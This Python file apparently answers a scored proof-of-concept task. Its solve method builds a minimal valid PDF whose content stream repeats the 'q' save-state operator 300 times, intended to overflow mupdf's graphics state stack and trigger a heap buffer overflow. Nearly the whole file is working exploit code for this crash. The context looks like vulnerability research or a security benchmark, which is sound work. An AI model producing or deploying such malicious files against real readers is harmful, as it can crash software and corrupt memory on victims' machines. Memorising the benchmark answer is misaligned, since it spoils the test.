import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.

        The vulnerability is a heap buffer overflow in mupdf's PDF parser. It's
        caused by not checking the graphics state stack limit before pushing a new
        state with the 'q' operator. The stack has a fixed size (GS_LIMIT = 256).
        Pushing more than 256 states (e.g., using 257 or more 'q' operators
        without corresponding 'Q' operators) causes an index to go out of bounds,
        leading to a write past the end of the heap-allocated gstate array.

        This solution constructs a minimal, valid PDF file containing a content
        stream with 300 'q' operators, which is sufficient to overflow the stack.
        The resulting PoC is very small, aiming for a high score.
        """
        # The payload consists of repeating the 'q' operator (save graphics state)
        # to overflow the graphics state stack. The stack limit is 256. A value of
        # 300 is chosen to be safely above this limit.
        payload = b'q ' * 300

        # Define the content of each PDF object to create a minimal valid PDF structure.
        objects = [
            # Object 1: Document Catalog
            b"<< /Type /Catalog /Pages 2 0 R >>",
            # Object 2: Page Tree
            b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>",
            # Object 3: Page Object
            b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 100 100] /Contents 4 0 R >>",
            # Object 4: Content Stream containing the malicious payload
            b"<< /Length %d >>\nstream\n%s\nendstream" % (len(payload), payload)
        ]

        # Assemble the PDF file, calculating byte offsets for the cross-reference table.
        pdf_parts = [b"%PDF-1.7\n"]
        offsets = []
        current_offset = len(pdf_parts[0])

        for i, obj_body in enumerate(objects):
            offsets.append(current_offset)
            # PDF objects are numbered starting from 1.
            obj_header = b"%d 0 obj\n" % (i + 1)
            obj_footer = b"\nendobj\n"
            full_obj = obj_header + obj_body + obj_footer
            pdf_parts.append(full_obj)
            current_offset += len(full_obj)

        xref_offset = current_offset
        num_xref_entries = len(objects) + 1

        # Build the cross-reference (xref) table.
        pdf_parts.append(b"xref\n")
        pdf_parts.append(b"0 %d\n" % num_xref_entries)
        # The first entry (object 0) is always the head of the free list.
        pdf_parts.append(b"0000000000 65535 f \n")
        for offset in offsets:
            # Format each offset as a 10-digit zero-padded string.
            pdf_parts.append(f"{offset:010d} 00000 n \n".encode('ascii'))

        # Build the trailer dictionary.
        trailer = b"trailer\n<< /Size %d /Root 1 0 R >>\n" % num_xref_entries
        pdf_parts.append(trailer)

        # Add the startxref and end-of-file markers.
        pdf_parts.append(b"startxref\n")
        pdf_parts.append(str(xref_offset).encode('ascii') + b"\n")
        pdf_parts.append(b"%%EOF\n")

        # Join all parts to form the final PoC byte string.
        return b"".join(pdf_parts)